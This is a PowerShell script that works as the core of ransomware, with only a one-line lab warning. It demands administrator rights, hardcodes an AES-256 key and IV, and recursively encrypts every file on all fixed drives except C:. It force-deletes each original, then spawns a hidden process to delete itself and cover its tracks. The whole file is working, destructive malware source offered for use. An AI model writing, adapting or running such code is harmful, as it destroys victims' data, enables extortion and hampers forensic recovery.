# AES Encryptor with Self-Delete
# WARNING: Use only in a controlled lab environment!

# Ensure running as Administrator
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "Please run this script as Administrator."
    exit
}

Write-Host "Running as Administrator.`n" -ForegroundColor Green

# Hardcoded AES Key and IV (Base64 Encoded)
$Base64Key = "xv1vm/NZYeyrBvW1PKrMbNWZBZu5WrUJ0PZrAE0Q3PA="
$Base64IV  = "7W2X2k+8bmQf3AojD7aW9w=="

# Setup AES
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.KeySize = 256
$AES.BlockSize = 128
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.Key = [Convert]::FromBase64String($Base64Key)
$AES.IV  = [Convert]::FromBase64String($Base64IV)

# Encrypt Function
function Encrypt-File {
    param([string]$InputPath)

    try {
        $InputBytes = [System.IO.File]::ReadAllBytes($InputPath)
        $Encryptor = $AES.CreateEncryptor()
        $Encrypted = $Encryptor.TransformFinalBlock($InputBytes, 0, $InputBytes.Length)

        $EncryptedPath = "$InputPath.enc"
        [System.IO.File]::WriteAllBytes($EncryptedPath, $Encrypted)
        Remove-Item $InputPath -Force

        Write-Host "Encrypted: $InputPath" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to encrypt `${InputPath}: $_"
    }
}

# Scan all non-C fixed drives
$Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
    $_.IsReady -and
    $_.DriveType -eq 'Fixed' -and
    $_.Name -ne "C:\"
}

foreach ($Drive in $Drives) {
    Write-Host "`nScanning drive: $($Drive.Name)" -ForegroundColor Cyan

    try {
        $Files = Get-ChildItem -Path $Drive.Name -Recurse -File -ErrorAction SilentlyContinue
    } catch {
        Write-Warning "Failed to access $($Drive.Name): $_"
        continue
    }

    foreach ($File in $Files) {
        if ($File.Extension -ne ".enc") {
            Encrypt-File -InputPath $File.FullName
        }
    }
}

Write-Host "`nEncryption completed." -ForegroundColor Yellow

# ===== Self-Delete Mechanism =====
$ScriptPath = $MyInvocation.MyCommand.Path
$Cmd = "Start-Sleep -Seconds 3; Remove-Item -Path `"$ScriptPath`" -Force"
Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$Cmd"
Write-Host "Script will now delete itself..." -ForegroundColor Red
